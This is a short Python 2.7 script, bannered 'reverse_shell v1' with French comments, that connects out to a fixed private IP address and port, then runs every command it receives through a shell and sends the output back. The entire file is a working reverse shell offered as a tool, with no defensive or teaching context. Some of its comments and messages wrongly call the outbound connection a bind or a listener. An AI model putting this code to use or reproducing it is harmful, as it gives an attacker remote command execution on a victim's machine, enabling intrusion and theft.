#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

# Import modules
import socket, time, sys, datetime, subprocess, os

print unicode("╔", 'utf-8') + unicode("═", 'utf-8') * 78 + unicode("╗", 'utf-8')
print unicode("║", 'utf-8') + "                        _,.--.                                                " + unicode("║", 'utf-8')
print unicode("║", 'utf-8') + "    --..,_           .'`__ o  `;__, reverse_shell                             " + unicode("║", 'utf-8')
print unicode("║", 'utf-8') + "       `'.'.       .'.'`  '---'`  ' v1                                        " + unicode("║", 'utf-8')
print unicode("║", 'utf-8') + "          '.`-...-'.'                                                         " + unicode("║", 'utf-8')
print unicode("║", 'utf-8') + "            `-...-'                                                           " + unicode("║", 'utf-8')
print unicode("╚", 'utf-8') + unicode("═", 'utf-8') * 78 + unicode("╝", 'utf-8')

# Définition des paramètres
host = '192.168.35.70'
port = 6666
print '[+] Creating socket...'
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind du socket avec les paramètres
print '[+] Bindded on port %s' % port
conn.connect((host, port))
print '[+] Now listening'

while True:
	try:
		# Accepte la connexion
		conn.send('Welcome\n')
		conn.send('Connection from : ' + socket.gethostname() + '\n')
		while True:
			try:
				conn.send(os.getcwd())
				conn.send('~> ')
				data = conn.recv(2048)
				if data.rstrip() == 'quit':
					conn.close()
					print '[+] Bye'
					sys.exit(1)
					break
				elif 'cd' in data.rstrip():
					os.chdir(data.rstrip().split(' ')[1])
				else:
					process = subprocess.Popen(data, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					out, err = process.communicate()
					conn.send(out)
					if err:
						conn.send(err)
						pass
			# Si on utilise CTRL+C
			except KeyboardInterrupt:
				# Ferme le socket
				conn.close()
				print '[+] Bye'
				sys.exit(1)
		pass
	# Si on utilise CTRL+C
	except KeyboardInterrupt:
		# Ferme le socket
		conn.close()
		print '[+] Bye'
		sys.exit(1)